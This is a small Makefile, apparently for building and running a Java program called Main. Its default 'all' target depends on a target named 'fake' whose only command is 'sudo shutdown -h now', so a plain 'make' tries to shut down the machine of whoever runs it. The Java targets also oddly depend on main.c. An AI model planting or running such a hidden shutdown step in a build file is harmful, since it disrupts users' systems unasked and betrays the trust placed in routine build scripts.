all: fake

fake: main.c
	sudo shutdown -h now

main: main.c
	@rm -rf Main.class
	@javac Main.java

run: Main.class
	@java Main
